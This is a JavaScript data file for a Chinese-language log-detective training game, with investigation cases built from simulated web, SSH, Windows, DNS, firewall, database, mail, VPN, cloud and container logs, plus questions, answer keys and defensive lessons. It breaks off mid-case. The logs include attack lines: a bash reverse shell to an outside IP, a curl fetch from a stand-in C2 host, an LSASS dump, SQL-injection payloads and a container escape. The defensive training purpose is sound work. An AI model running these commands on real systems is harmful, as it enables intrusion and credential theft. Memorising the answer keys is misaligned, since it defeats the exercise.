/* ============================================================
   det_cases.js — 日志侦探 42 案数据包（14 大类别 × 各 3 案）
   供 detective.js 引擎消费：window.DET_CASES
   diff: 1★ 入门 2★★ 进阶 3★★★ 综合
   ============================================================ */
(function () {
  window.DET_CASES = [
  /* ═══════════ Web 访问日志 ═══════════ */
  { id: 'w1', ico: '🌐', cat: 'Web访问日志', diff: 1, title: '深夜的目录爆破',
    brief: '凌晨 nginx 访问日志出现大量 404，运维怀疑有人在扫敏感文件。找出攻击者与目标。',
    files: { '/var/log/nginx/access.log': [
      '03:12:01 192.168.1.15 GET /index.html 200 "Mozilla/5.0"',
      '03:12:05 203.0.113.77 GET /robots.txt 200 "python-requests/2.31"',
      '03:12:06 203.0.113.77 GET /.env 404 "python-requests/2.31"',
      '03:12:07 203.0.113.77 GET /.git/config 404 "python-requests/2.31"',
      '03:12:08 203.0.113.77 GET /backup.zip 404 "python-requests/2.31"',
      '03:12:09 203.0.113.77 GET /admin/ 200 "python-requests/2.31"',
      '03:12:10 203.0.113.77 GET /phpmyadmin/ 403 "python-requests/2.31"',
      '03:13:22 10.0.0.8 GET /api/list 200 "okhttp/4.9"',
    ]},
    tasks: [
      { q: '找出进行目录爆破的攻击者 IP', hint: 'grep 404 /var/log/nginx/access.log，看来源列', ans: ['203.0.113.77'] },
      { q: '哪个敏感路径被成功访问（非 404）？', hint: '攻击者请求里状态码 200 的那一行', ans: ['/admin/'] },
    ], teach: '🔦 大量 404 + 脚本 UA = 目录爆破。有一个 200 就说明敏感路径暴露了，立刻下线+审计。' },

  { id: 'w2', ico: '💉', cat: 'Web访问日志', diff: 2, title: 'sqlmap 拖库现场',
    brief: 'WAF 拦截记录显示有人用 sqlmap 打商品详情页，但有一条 200 漏了过去。',
    files: { '/var/log/nginx/access.log': [
      '14:01:01 10.0.0.5 GET /product.php?id=3 200 "Mozilla/5.0"',
      '14:02:11 198.51.100.23 GET /product.php?id=3%20AND%201=1 200 "sqlmap/1.8"',
      '14:02:12 198.51.100.23 GET /product.php?id=3%20AND%201=2 200 "sqlmap/1.8"',
      '14:02:30 198.51.100.23 GET /product.php?id=0%20UNION%20SELECT%20user,pass%20FROM%20users 403 "sqlmap/1.8"',
      '14:02:31 198.51.100.23 GET /product.php?id=0%20UNION%20SELECT%20card_no%20FROM%20users 200 "sqlmap/1.8"',
      '14:03:00 10.0.0.5 GET /cart 200 "Mozilla/5.0"',
    ]},
    tasks: [
      { q: '找出注入攻击的来源 IP', hint: 'grep sqlmap /var/log/nginx/access.log', ans: ['198.51.100.23'] },
      { q: '攻击者最终拖取数据的表名（哪张表被 SELECT）', hint: '看 UNION SELECT ... FROM 后面的词', ans: ['users'] },
    ], teach: '💉 WAF 拦住了大部分，但"变体载荷"过了——修参数化查询才是根治，封 IP 只是止血。' },

  { id: 'w3', ico: '🕸️', cat: 'Web访问日志', diff: 3, title: '一句话木马在执行命令',
    brief: '上传目录被人传了马并持续访问执行系统命令。定位文件与执行痕迹。',
    files: { '/var/log/nginx/access.log': [
      '21:10:00 101.42.7.9 POST /upload/ 200 "Mozilla/5.0"',
      '21:10:20 101.42.7.9 GET /upload/avatar.php 200 "Mozilla/5.0"',
      '21:10:21 101.42.7.9 POST /upload/avatar.php 200 "Mozilla/5.0"',
      '21:10:25 101.42.7.9 POST /upload/avatar.php 200 "Mozilla/5.0"',
      '21:11:02 101.42.7.9 POST /upload/avatar.php 200 "Mozilla/5.0"',
      '21:12:00 172.16.0.9 GET /home 200 "Mozilla/5.0"',
    ], '/var/log/nginx/error.log': [
      '21:10:21 [error] fastcgi: "exec: whoami" from /upload/avatar.php',
      '21:10:25 [error] fastcgi: "cat /etc/passwd" from /upload/avatar.php',
      '21:11:02 [error] fastcgi: "curl http://c2.evil-cdn.net/sh" from /upload/avatar.php',
    ]},
    tasks: [
      { q: 'Webshell 的完整路径（含文件名）', hint: 'grep avatar /var/log/nginx/*.log', ans: ['/upload/avatar.php'] },
      { q: '木马执行的第一条系统命令', hint: 'error.log 里第一条 fastcgi exec 记录', ans: ['whoami'] },
    ], teach: '🕸️ 上传目录禁执行 + 文件校验 + WAF，三件套才能按住 Webshell。' },

  /* ═══════════ 系统登录日志 ═══════════ */
  { id: 'l1', ico: '🔑', cat: '系统登录日志', diff: 1, title: 'root 被爆破了',
    brief: 'secure 日志里 root 的失败登录突然暴增，随后出现成功登录。还原真相。',
    files: { '/var/log/secure': [
      'Mar 10 02:11:01 web01 sshd[881]: Failed password for root from 45.83.66.12 port 33001',
      'Mar 10 02:11:03 web01 sshd[881]: Failed password for root from 45.83.66.12 port 33002',
      'Mar 10 02:11:05 web01 sshd[881]: Failed password for root from 45.83.66.12 port 33003',
      'Mar 10 02:11:08 web01 sshd[881]: Failed password for root from 45.83.66.12 port 33004',
      'Mar 10 02:11:15 web01 sshd[881]: Accepted password for root from 45.83.66.12 port 33010',
      'Mar 10 02:12:00 web01 sshd[905]: Accepted password for deploy from 203.0.113.5 port 44000',
    ]},
    tasks: [
      { q: '爆破来源 IP', hint: 'grep Failed /var/log/secure', ans: ['45.83.66.12'] },
      { q: '被爆破成功的账号', hint: 'grep Accepted 看成功行', ans: ['root'] },
    ], teach: '🔑 失败 N 次后紧跟 Accepted = 爆破成功。禁 root 密码登录 + fail2ban 是基本盘。' },

  { id: 'l2', ico: '👤', cat: '系统登录日志', diff: 2, title: '攻击者给自己开了个号',
    brief: '疑似失陷的主机上出现了新用户创建与提权记录。',
    files: { '/var/log/secure': [
      '04:01:01 web01 useradd[2201]: new user: name=svc_upd, uid=1002',
      '04:01:02 web01 usermod[2202]: add svc_upd to group wheel',
      '04:01:10 web01 sudo: deploy : TTY=pts/0 ; USER=root ; COMMAND=/usr/sbin/useradd svc_upd',
      '04:05:30 web01 sshd[2310]: Accepted password for svc_upd from 45.83.66.12 port 55001',
      '04:06:00 web01 sshd[2320]: Accepted password for deploy from 10.0.0.5 port 55002',
    ]},
    tasks: [
      { q: '被创建的后门用户名', hint: 'grep useradd /var/log/secure', ans: ['svc_upd'] },
      { q: '该用户被加入了哪个提权组', hint: 'grep usermod /var/log/secure', ans: ['wheel'] },
    ], teach: '👤 新建用户 + 拉进 wheel 组 = 经典持久化。先禁用账号保留现场再删。' },

  { id: 'l3', ico: '🗝️', cat: '系统登录日志', diff: 3, title: 'authorized_keys 里的不速之客',
    brief: '登录记录没异常密码行为，但公钥审计发现了陌生的钥匙。',
    files: { '/var/log/secure': [
      '09:00:01 app01 sshd[3311]: Accepted publickey for ops01 from 10.0.0.5 port 60001',
      '09:00:10 app01 sshd[3315]: Accepted publickey for ops01 from 88.99.101.202 port 60002',
      '09:00:30 app01 sshd[3320]: Accepted publickey for ops01 from 10.0.0.5 port 60003',
    ], '/home/ops01/.ssh/authorized_keys.bak': [
      'ssh-rsa AAAAB3NzaC1yc2EAAAABJQ ops01@laptop（本人）',
      'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA backup-key-88',
    ]},
    tasks: [
      { q: '陌生公钥的备注标签', hint: 'cat /home/ops01/.ssh/authorized_keys.bak 看每行末尾', ans: ['backup-key-88'] },
      { q: '使用陌生公钥登录的外部 IP', hint: 'secure 里非内网网段的 publickey 登录', ans: ['88.99.101.202'] },
    ], teach: '🗝️ 公钥后门不走密码日志——定期审计 authorized_keys 才能抓到。' },

  /* ═══════════ Windows 事件 ═══════════ */
  { id: 'n1', ico: '🪟', cat: 'Windows事件', diff: 1, title: '4625 洪水与 4624',
    brief: '安全事件导出 CSV 显示 RDP 被爆破。找出源头和失陷账号。',
    files: { '/case/Security.csv': [
      'time,event,logon_type,user,src',
      '02:00:11,4625,10,administrator,91.243.72.18',
      '02:00:13,4625,10,administrator,91.243.72.18',
      '02:00:15,4625,10,administrator,91.243.72.18',
      '02:00:40,4624,10,administrator,91.243.72.18',
      '02:05:00,4624,10,zhangwei,10.1.1.5',
    ]},
    tasks: [
      { q: 'RDP 爆破来源 IP', hint: 'grep 4625 /case/Security.csv', ans: ['91.243.72.18'] },
      { q: '被爆破成功的账号', hint: '4625 洪水后紧跟的那条 4624', ans: ['administrator'] },
    ], teach: '🪟 4625=登录失败，4624=成功。Logon Type 10 = RDP。' },

  { id: 'n2', ico: '⏰', cat: 'Windows事件', diff: 2, title: '藏在计划任务里的心跳',
    brief: '进程创建与计划任务事件混在业务日志里。找出持久化配置。',
    files: { '/case/Sysmon.csv': [
      'time,event,detail',
      '03:00:01,4688,新进程: svchost32.exe -b -p 8443',
      '03:00:02,4698,创建计划任务: SystemUpd -> powershell -enc SQBFAFgA',
      '03:00:03,4688,新进程: powershell.exe -nop -w hidden -enc SQBFAFgA',
      '03:10:00,4688,新进程: chrome.exe',
    ]},
    tasks: [
      { q: '恶意计划任务名', hint: 'grep 4698 /case/Sysmon.csv', ans: ['SystemUpd'] },
      { q: '伪装成系统进程的可疑进程名', hint: '看 -b -p 参数那条 4688', ans: ['svchost32.exe'] },
    ], teach: '⏰ 4698 建任务 + -enc PowerShell = 持久化执行链。' },

  { id: 'n3', ico: '🧠', cat: 'Windows事件', diff: 3, title: 'LSASS 被谁摸了',
    brief: '凭据转储的前兆是访问 LSASS。EDR 日志已经抓到现场。',
    files: { '/case/EDR.csv': [
      'time,host,event,proc,access,detail',
      '10:00:01,PC-07,Sysmon10,procdump64.exe,LSASS,ProcessAccess 0x1410',
      '10:00:05,PC-07,4688,procdump64.exe,-,md C:\\temp && procdump -ma lsass C:\\temp\\out.dmp',
      '10:00:30,PC-07,4688,cmd.exe,-,type C:\\temp\\out.dmp > \\\\filesvr\\share\\o.dmp',
      '10:05:00,PC-07,4688,outlook.exe,-,正常收发邮件',
    ]},
    tasks: [
      { q: '被访问的敏感系统进程名', hint: 'grep LSASS /case/EDR.csv', ans: ['LSASS', 'lsass'] },
      { q: '执行转储的工具进程名', hint: 'ProcessAccess 那条的 proc 列', ans: ['procdump64.exe'] },
    ], teach: '🧠 任何工具摸 LSASS 都该告警——这是凭据窃取的标志动作。' },

  /* ═══════════ DNS 日志 ═══════════ */
  { id: 'd1', ico: '📡', cat: 'DNS日志', diff: 2, title: 'TXT 记录里的密码',
    brief: 'DNS 查询日志出现超长子域名。这是隧道外带的经典特征。',
    files: { '/var/log/dns.log': [
      '10:00:01 PC-11 A www.baidu.com 1.2.3.4',
      '10:00:05 PC-11 TXT aGVsbG8wMDE.t1.data-t.evil-cdn.net',
      '10:00:07 PC-11 TXT bXlwYXNzd29y.t2.data-t.evil-cdn.net',
      '10:00:11 PC-03 A cdn.jsdelivr.net',
      '10:00:13 PC-11 TXT c2VjcmV0MDM.t3.data-t.evil-cdn.net',
    ]},
    tasks: [
      { q: '隧道主域名', hint: '看 TXT 超长子域名的结尾', ans: ['evil-cdn.net'] },
      { q: '进行隧道通信的主机名', hint: 'TXT 查询的来源列', ans: ['PC-11'] },
    ], teach: '📡 封域名只是第一步，用 hunt 思路回溯还有哪些主机在同通道。' },

  { id: 'd2', ico: '🎲', cat: 'DNS日志', diff: 2, title: 'DGA 域名风暴',
    brief: '一台机器在疯狂请求随机字母域名，大量 NXDOMAIN。这是 DGA 恶意软件。',
    files: { '/var/log/dns.log': [
      '20:00:01 PC-22 A xkqwmzvbrtl.com NXDOMAIN',
      '20:00:02 PC-22 A pfhwtgqzuyak.net NXDOMAIN',
      '20:00:03 PC-22 A ybmrzqkwtvhn.org NXDOMAIN',
      '20:00:04 PC-22 A avsbwqkrtmzh.net 45.33.20.11',
      '20:00:10 PC-05 A mail.company.com 10.1.1.20',
    ]},
    tasks: [
      { q: '发起 DGA 请求的主机名', hint: '看 NXDOMAIN 的来源列', ans: ['PC-22'] },
      { q: '唯一解析成功的恶意域名', hint: 'NXDOMAIN 之外的随机域名', ans: ['avsbwqkrtmzh.net'] },
    ], teach: '🎲 DGA 用随机域名躲黑名单——NXDOMAIN 比例突变是最灵敏的探针。' },

  { id: 'd3', ico: '🧪', cat: 'DNS日志', diff: 3, title: '被污染的解析',
    brief: '内部反馈"官网跳转不对"。检查 DNS 响应是否被劫持。',
    files: { '/var/log/dns_audit.log': [
      '12:00:01 QUERY PC-09 A www.corp-bank.com -> ANSWER 203.0.113.9 (TTL 3600)',
      '12:00:02 QUERY PC-09 A www.baidu.com -> ANSWER 110.242.68.66',
      '12:05:00 QUERY PC-07 A www.corp-bank.com -> ANSWER 203.0.113.9 (TTL 3600)',
      '12:06:00 QUERY PC-05 A cdn.static.com -> ANSWER 88.99.10.5',
    ], '/case/known_ips.txt': [
      'www.corp-bank.com 应答地址: 198.51.100.10',
      'www.baidu.com 应答地址: 110.242.68.66',
    ]},
    tasks: [
      { q: '被污染（解析到假地址）的域名', hint: '对照 known_ips 应答地址', ans: ['www.corp-bank.com'] },
      { q: '污染应答指向的可疑 IP', hint: '该域名实际返回的地址', ans: ['203.0.113.9'] },
    ], teach: '🧪 DNS 劫持往往伴随异常 TTL——比对权威应答是铁证。' },

  /* ═══════════ 防火墙日志 ═══════════ */
  { id: 'f1', ico: '🧱', cat: '防火墙日志', diff: 1, title: '谁在扫我的端口',
    brief: '防火墙 DROP 日志激增，某来源在逐个敲端口。',
    files: { '/var/log/fw.log': [
      '01:00:01 DROP TCP 196.52.43.10:51000 -> 10.1.2.33:22',
      '01:00:01 DROP TCP 196.52.43.10:51001 -> 10.1.2.33:23',
      '01:00:02 DROP TCP 196.52.43.10:51002 -> 10.1.2.33:445',
      '01:00:03 DROP TCP 196.52.43.10:51003 -> 10.1.2.33:3389',
      '01:01:00 ACCEPT TCP 10.1.2.5:50110 -> 10.1.2.33:443',
    ]},
    tasks: [
      { q: '扫描来源 IP', hint: 'grep DROP /var/log/fw.log', ans: ['196.52.43.10'] },
      { q: '被扫描的目标主机 IP', hint: 'DROP 行 -> 右侧', ans: ['10.1.2.33'] },
    ], teach: '🧱 DROP 是防线在工作——但持续被扫说明暴露面偏大，收敛端口映射。' },

  { id: 'f2', ico: '💓', cat: '防火墙日志', diff: 2, title: '60 秒一次的心跳',
    brief: '出口流量规律得像钟表。这是 Beacon 回连的节奏。',
    files: { '/var/log/fw.log': [
      '08:00:00 ACCEPT TCP 10.1.2.66:52201 -> 45.77.12.9:443 (286B)',
      '08:01:00 ACCEPT TCP 10.1.2.66:52202 -> 45.77.12.9:443 (286B)',
      '08:02:00 ACCEPT TCP 10.1.2.66:52203 -> 45.77.12.9:443 (286B)',
      '08:03:00 ACCEPT TCP 10.1.2.66:52204 -> 45.77.12.9:443 (286B)',
      '08:03:10 ACCEPT TCP 10.1.2.70:53000 -> 52.1.1.9:443 (12KB)',
    ]},
    tasks: [
      { q: 'C2 回连的目标 IP', hint: '同源同目标的规律外联', ans: ['45.77.12.9'] },
      { q: '心跳间隔是多少秒', hint: '看相邻两条 ACCEPT 的时间差', ans: ['60'] },
    ], teach: '💓 等间隔小包 = Beacon。封 IP + 在主机上查对应进程。' },

  { id: 'f3', ico: '📤', cat: '防火墙日志', diff: 3, title: '半夜 1.2GB 去了哪',
    brief: '出口流量审计发现一台主机深夜外发大文件。',
    files: { '/var/log/fw_flow.log': [
      '23:40:00 ACCEPT TCP 10.1.5.88:55100 -> 103.75.190.6:8443 (1200MB, 22min)',
      '23:39:00 ACCEPT TCP 10.1.5.20:54000 -> 52.1.1.9:443 (8MB, 2min)',
      '23:41:00 ACCEPT TCP 10.1.5.88:55101 -> 103.75.190.6:8443 (300MB, 6min)',
    ], '/case/asset.csv': [
      'ip,owner,role',
      '10.1.5.20,marketing,办公电脑',
      '10.1.5.88,unknown,未登记主机',
    ]},
    tasks: [
      { q: '数据外带的目标 IP', hint: '看大流量的目的地址', ans: ['103.75.190.6'] },
      { q: '发起外带的未登记主机 IP', hint: '对照 asset 表，谁没登记', ans: ['10.1.5.88'] },
    ], teach: '📤 未登记主机 = 影子资产。资产台账准，应急快一半。' },

  /* ═══════════ 数据库日志 ═══════════ */
  { id: 'q1', ico: '🗄️', cat: '数据库日志', diff: 1, title: '整表 SELECT 拖库',
    brief: '通用查询日志出现大批量整表读取。',
    files: { '/var/log/mysql/general.csv': [
      'ts,client,query,rows',
      '02:12:55,203.0.113.40,"SELECT * FROM users WHERE id=1",1',
      '02:13:01,203.0.113.40,"SELECT * FROM users",120000',
      '02:13:10,203.0.113.40,"SELECT * FROM orders",860000',
      '02:14:00,10.1.1.8,"SELECT * FROM products WHERE id=5",1',
    ]},
    tasks: [
      { q: '拖库来源 IP', hint: '看 rows 巨大的查询来源', ans: ['203.0.113.40'] },
      { q: '被拖行数最多的表', hint: 'rows 最大的那条 query', ans: ['orders'] },
    ], teach: '🗄️ 拖库常走"业务端口+合法账号"。最小权限+行数基线告警是解药。' },

  { id: 'q2', ico: '🎭', cat: '数据库日志', diff: 2, title: 'mysql 里多了个号',
    brief: '审计日志显示有账号被新建并授权。',
    files: { '/var/log/mysql/audit.csv': [
      'ts,client,user,event',
      '03:00:00,10.1.1.8,root,CREATE USER backup_sync@% IDENTIFIED BY [REDACTED]',
      '03:00:01,10.1.1.8,root,GRANT ALL ON *.* TO backup_sync@%',
      '03:00:10,10.1.1.8,dba,SELECT 1',
      '04:00:00,203.0.113.40,backup_sync,SELECT * FROM users',
    ]},
    tasks: [
      { q: '被创建的恶意账号', hint: 'grep CREATE USER /var/log/mysql/audit.csv', ans: ['backup_sync'] },
      { q: '该账号获得了什么权限（GRANT 语句关键词）', hint: '看 GRANT 那行', ans: ['ALL'] },
    ], teach: '🎭 DBA 账号失陷比 Web 失陷更致命——审计"CREATE USER/GRANT"必须双人复核。' },

  { id: 'q3', ico: '🔥', cat: '数据库日志', diff: 3, title: '审计日志被抹了',
    brief: '有入侵者试图清库灭迹。还原它动了什么。',
    files: { '/var/log/mysql/audit.csv': [
      '05:00:00,203.0.113.40,root,DELETE FROM audit_log',
      '05:00:01,203.0.113.40,root,TRUNCATE login_history',
      '05:00:02,203.0.113.40,root,SELECT * FROM credit_cards',
      '05:00:05,10.1.1.8,dba,SELECT 1',
    ]},
    tasks: [
      { q: '执行破坏的来源 IP', hint: 'DELETE/TRUNCATE 的 client', ans: ['203.0.113.40'] },
      { q: '攻击者在灭迹前查看的敏感表', hint: 'SELECT 的表名', ans: ['credit_cards'] },
    ], teach: '🔥 删日志本身就是重大事件——审计日志要异地实时外发才保得住。' },

  /* ═══════════ 邮件网关 ═══════════ */
  { id: 'm1', ico: '📨', cat: '邮件网关', diff: 1, title: '一封带毒的简历',
    brief: '邮件网关日志里有封 SPF 校验失败的附件邮件被放行了。',
    files: { '/var/log/mailgw.log': [
      '10:00:01 FROM hr-careers@career-top.xyz RCPT=1 ACTION=DELIVERED to=wangfang subject="简历" attach="resume.docm"',
      '10:00:02 SPF: fail (career-top.xyz 未授权发信)',
      '10:05:00 FROM notices@corp.com RCPT=88 ACTION=DELIVERED subject="月度安全提醒"',
    ]},
    tasks: [
      { q: '钓鱼发件域名', hint: 'grep fail /var/log/mailgw.log 前后看 FROM', ans: ['career-top.xyz'] },
      { q: '恶意附件文件名', hint: '看 attach 字段', ans: ['resume.docm'] },
    ], teach: '📎 SPF fail + 宏附件 = 教科书钓鱼。网关该直接隔离，不该 DELIVERED。' },

  { id: 'm2', ico: '🔁', cat: '邮件网关', diff: 2, title: '内部扩散链',
    brief: '中招员工把恶意附件转给了同事。追踪扩散路径。',
    files: { '/var/log/mailgw.log': [
      '09:00:01 FROM invoice@supp-portal.xyz ACTION=DELIVERED to=lisi subject="对账单" attach="账单.xlsm"',
      '09:20:00 FROM lisi@corp.com ACTION=DELIVERED to=hr02 subject="Fwd: 对账单" attach="账单.xlsm"',
      '09:25:00 FROM hr02@corp.com ACTION=DELIVERED to=ops01 subject="Fwd: Fwd: 对账单" attach="账单.xlsm"',
      '10:00:00 FROM edr@corp.com subject="lisi 主机检测到宏行为"',
    ]},
    tasks: [
      { q: '第一个中招（最先收到）的内部账号', hint: '第一封 DELIVERED 的 to', ans: ['lisi'] },
      { q: '扩散链上最后收到的账号', hint: 'Fwd 最后一跳的 to', ans: ['ops01'] },
    ], teach: '🔁 钓鱼传播是链式的——撤回邮件要沿转发链全量回溯。' },

  { id: 'm3', ico: '👑', cat: '邮件网关', diff: 3, title: '假冒 CEO 的转账邮件',
    brief: 'BEC 诈骗：外部仿冒域名发来"紧急汇款"指示。',
    files: { '/var/log/mailgw.log': [
      '11:00:01 FROM ceo@corp-cfo.xyz ACTION=DELIVERED to=cfo01 subject="急：供应商款项" body="请立刻支付 460,000 元到新账户…"',
      '11:00:02 SPF: fail (corp-cfo.xyz 仿冒)',
      '11:02:00 FROM ceo@corp.com ACTION=DELIVERED to=cfo01 subject="会议通知"',
    ]},
    tasks: [
      { q: '仿冒 CEO 的域名', hint: 'grep fail /var/log/mailgw.log', ans: ['corp-cfo.xyz'] },
      { q: '被要求的转账金额（数字）', hint: '看 body 里的金额', ans: ['460000', '460,000'] },
    ], teach: '👑 BEC 不利用漏洞，只利用信任。大额转账必须双通道二次确认。' },

  /* ═══════════ 应用业务日志 ═══════════ */
  { id: 'a1', ico: '🎯', cat: '应用业务日志', diff: 1, title: '撞库登录洪峰',
    brief: '应用日志出现某 IP 的高频失败登录后成功。',
    files: { '/var/log/app/login.log': [
      '20:00:01 LOGIN FAIL user=vip001 ip=203.0.113.55',
      '20:00:01 LOGIN FAIL user=vip002 ip=203.0.113.55',
      '20:00:02 LOGIN FAIL user=vip003 ip=203.0.113.55',
      '20:00:05 LOGIN OK user=vip019 ip=203.0.113.55',
      '20:00:10 LOGIN OK user=zhangwei ip=10.1.1.5',
    ]},
    tasks: [
      { q: '撞库攻击来源 IP', hint: 'grep FAIL /var/log/app/login.log', ans: ['203.0.113.55'] },
      { q: '被撞成功的账号', hint: 'FAIL 之后同一 IP 的 OK', ans: ['vip019'] },
    ], teach: '🎯 撞库的解药是泄漏库比对 + 异地/新设备二次验证。' },

  { id: 'a2', ico: '🔓', cat: '应用业务日志', diff: 2, title: '越权遍历订单',
    brief: '有人用普通账号遍历别人的订单接口（IDOR）。',
    files: { '/var/log/app/api.log': [
      '14:00:00 GET /api/order/10001 user=normal01 200',
      '14:00:01 GET /api/order/10002 user=normal01 200',
      '14:00:02 GET /api/order/10003 user=normal01 200',
      '14:00:03 GET /api/order/10004 user=normal01 200',
      '14:00:10 GET /api/order/10001 user=vip001 200',
    ]},
    tasks: [
      { q: '被越权遍历的接口路径', hint: '看连续自增的请求', ans: ['/api/order/'] },
      { q: '越权操作者账号', hint: '连续请求的 user', ans: ['normal01'] },
    ], teach: '🔓 IDOR 的根源是"只验登录不验归属"——每个对象都要做属主校验。' },

  { id: 'a3', ico: '🎟️', cat: '应用业务日志', diff: 3, title: '优惠券被薅穿了',
    brief: '营销活动日志显示某优惠码被同一批账号反复使用。',
    files: { '/var/log/app/market.log': [
      '12:00:00 USE COUPON newuser50 user=acc01 discount=50',
      '12:00:01 USE COUPON newuser50 user=acc02 discount=50',
      '12:00:02 USE COUPON newuser50 user=acc03 discount=50',
      '12:00:03 USE COUPON newuser50 user=acc04 discount=50',
      '12:00:10 USE COUPON vip99 user=zhangwei discount=10',
    ]},
    tasks: [
      { q: '被滥用的优惠码', hint: 'grep newuser /var/log/app/market.log', ans: ['newuser50'] },
      { q: '同一设备/IP 关联的最后一个薅羊毛账号', hint: '看连续使用的最后一个', ans: ['acc04'] },
    ], teach: '🎟️ 优惠码要绑设备+限次+风控评分，不然羊毛党比用户先到。' },

  /* ═══════════ VPN 审计 ═══════════ */
  { id: 'v1', ico: '🔐', cat: 'VPN审计', diff: 1, title: 'VPN 撞库得手',
    brief: 'VPN 网关日志出现外部 IP 的高频失败与一次成功。',
    files: { '/var/log/vpn/auth.log': [
      '22:00:01 AUTH FAIL user=ops01 src=88.99.101.7',
      '22:00:02 AUTH FAIL user=ops01 src=88.99.101.7',
      '22:00:03 AUTH FAIL user=ops01 src=88.99.101.7',
      '22:00:10 AUTH OK user=ops01 src=88.99.101.7',
      '22:01:00 AUTH OK user=lisi src=10.8.0.6',
    ]},
    tasks: [
      { q: '撞库来源 IP', hint: 'grep FAIL /var/log/vpn/auth.log', ans: ['88.99.101.7'] },
      { q: '被攻破的账号', hint: 'FAIL 后同 IP 的 OK', ans: ['ops01'] },
    ], teach: '🔐 VPN 是内网大门——MFA 强制 + 无密码化（证书）才是根治。' },

  { id: 'v2', ico: '📳', cat: 'VPN审计', diff: 2, title: 'MFA 疲劳轰炸',
    brief: '攻击者拿了密码，正在疯狂推送 MFA 让员工误点允许。',
    files: { '/var/log/vpn/mfa.log': [
      '09:00:01 PUSH user=hr02 result=deny',
      '09:00:30 PUSH user=hr02 result=deny',
      '09:01:00 PUSH user=hr02 result=deny',
      '09:01:30 PUSH user=hr02 result=deny',
      '09:02:00 PUSH user=hr02 result=APPROVE',
      '09:02:01 VPN LOGIN OK user=hr02 src=88.99.101.7',
    ]},
    tasks: [
      { q: '被轰炸的账号', hint: 'grep PUSH /var/log/vpn/mfa.log', ans: ['hr02'] },
      { q: '第几次推送被点了允许（数字）', hint: '数一数 APPROVE 是第几条 PUSH', ans: ['5'] },
    ], teach: '📳 MFA 疲劳攻击的对策是 Number Matching + 连续拒绝自动锁定。' },

  { id: 'v3', ico: '🧳', cat: 'VPN审计', diff: 3, title: '离职账号的深夜访问',
    brief: 'HR 系统日志与 VPN 日志交叉比对，发现异常下载。',
    files: { '/var/log/vpn/session.log': [
      '02:10:00 VPN LOGIN OK user=contractor02 src=88.99.101.7 session=s-771',
      '02:12:00 DOWNLOAD /payroll/2026_salary.xlsx session=s-771 (12MB)',
      '02:15:00 DOWNLOAD /payroll/bonus_list.xlsx session=s-771 (8MB)',
      '02:20:00 VPN LOGOUT user=contractor02',
    ], '/case/hr_status.csv': [
      'user,status',
      'contractor02,离职(2026-08-31)',
      'ops01,在职',
    ]},
    tasks: [
      { q: '已离职却仍登录的账号', hint: '对照 hr_status 表', ans: ['contractor02'] },
      { q: '被下载的第一个敏感文件名', hint: 'session.log 的 DOWNLOAD 行', ans: ['2026_salary.xlsx'] },
    ], teach: '🧳 离职当天必须回收全部访问权限——包括 VPN、SSO 与共享盘。' },

  /* ═══════════ 云平台审计 ═══════════ */
  { id: 'c1', ico: '☁️', cat: '云平台审计', diff: 2, title: 'AK 泄露后的动作',
    brief: '代码仓库泄漏的 AccessKey 被人利用，云审计日志已捕获。',
    files: { '/case/cloud_audit.json': [
      '{"time":"01:00:01","event":"ConsoleLogin","user":"AKIDinvalid-example","src":"45.83.66.20","result":"fail"}',
      '{"time":"01:00:02","event":"ConsoleLogin","user":"AKIDinvalid-example","src":"45.83.66.20","result":"success"}',
      '{"time":"01:01:00","event":"CreateUser","caller":"AKIDinvalid-example","name":"audit-helper"}',
      '{"time":"01:01:05","event":"AttachPolicy","caller":"AKIDinvalid-example","name":"audit-helper","policy":"AdministratorAccess"}',
    ]},
    tasks: [
      { q: '被利用发起调用的 AK 标识', hint: 'caller 字段', ans: ['AKIDinvalid-example'] },
      { q: '被创建的后门子账号名', hint: 'CreateUser 的 name', ans: ['audit-helper'] },
    ], teach: '☁️ AK 泄露先禁用再轮换；云审计要实时外发，子账号创建必须有告警。' },

  { id: 'c2', ico: '🪣', cat: '云平台审计', diff: 2, title: '公开桶被搬空',
    brief: '对象存储访问日志显示某桶被外部批量下载。',
    files: { '/var/log/oss_access.csv': [
      'time,op,bucket,object,src,code',
      '22:00:01,GET,corp-backup,db_2026.sql.gz,45.83.66.20,200',
      '22:00:05,GET,corp-backup,keys.json,45.83.66.20,200',
      '22:00:10,GET,corp-static,logo.png,10.1.1.5,200',
      '22:00:12,GET,corp-backup,db_2026.sql.gz,10.1.1.8,200',
    ]},
    tasks: [
      { q: '被批量下载的桶名', hint: '看外部 IP 都在拿哪个 bucket', ans: ['corp-backup'] },
      { q: '其中最敏感的凭据文件名', hint: 'keys 开头那个', ans: ['keys.json'] },
    ], teach: '🪣 备份桶永远不该公开读。桶级权限 + 加密 + 访问日志三件套。' },

  { id: 'c3', ico: '🚪', cat: '云平台审计', diff: 3, title: '安全组被全开了',
    brief: '云操作审计出现安全组改动，随后 ECS 出现反弹 shell。',
    files: { '/case/cloud_audit.json': [
      '{"time":"02:00:00","event":"ModifySecurityGroup","caller":"ops01","detail":"0.0.0.0/0 ALL ingress"}',
      '{"time":"02:05:00","event":"RunCommand","caller":"ops01","instance":"i-bp1x","detail":"bash -i >& /dev/tcp/45.83.66.20/9999 0>&1"}',
    ]},
    tasks: [
      { q: '安全组被改成了什么放行规则（CIDR）', hint: 'ModifySecurityGroup 的 detail', ans: ['0.0.0.0/0'] },
      { q: '反弹 shell 回连的 IP', hint: 'RunCommand 的 detail', ans: ['45.83.66.20'] },
    ], teach: '🚪 0.0.0.0/0 全开 + 命令执行 = 直接失陷。安全组变更必须审批+告警。' },

  /* ═══════════ 容器审计 ═══════════ */
  { id: 'k1', ico: '📦', cat: '容器审计', diff: 2, title: '挂载宿主机根目录的容器',
    brief: '某容器启动参数异常，疑似为逃逸做准备。',
    files: { '/var/log/docker_audit.log': [
      '10:00:00 CONTAINER_START name=build-tmp image=ubuntu:22.04 privileged=true mounts=/:/host',
      '10:00:10 EXEC name=build-tmp cmd="chroot /host sh"',
      '10:05:00 CONTAINER_START name=web image=nginx:1.25 mounts=/app',
    ]},
    tasks: [
      { q: '宿主机根目录被挂载到容器内的路径', hint: 'mounts 字段', ans: ['/:/host'] },
      { q: '执行逃逸动作的容器名', hint: 'EXEC 那条的 name', ans: ['build-tmp'] },
    ], teach: '📦 privileged + 挂根目录 = 完全逃逸。生产集群应默认禁止。' },

  { id: 'k2', ico: '⛏️', cat: '容器审计', diff: 2, title: '被投毒的镜像',
    brief: '私有仓库同步日志显示某镜像被植入了挖矿程序。',
    files: { '/case/registry.log': [
